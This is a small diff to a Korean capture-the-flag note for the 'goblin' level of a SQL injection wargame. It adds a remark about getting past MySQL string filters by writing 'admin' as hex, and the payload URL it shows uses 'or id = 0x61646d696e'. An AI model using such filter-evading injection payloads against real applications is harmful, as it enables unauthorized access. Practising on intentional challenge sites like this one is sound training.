@@ -1,3 +1,5 @@
+- Mysql 문자열 우회
+- ASCII to HEX 하여 우회한다.
 # Payload
 ```text
 https://los.rubiya.kr/chall/goblin_e5afb87a6716708e3af46a849517afdc.php?no=0 or id = 0x61646d696e
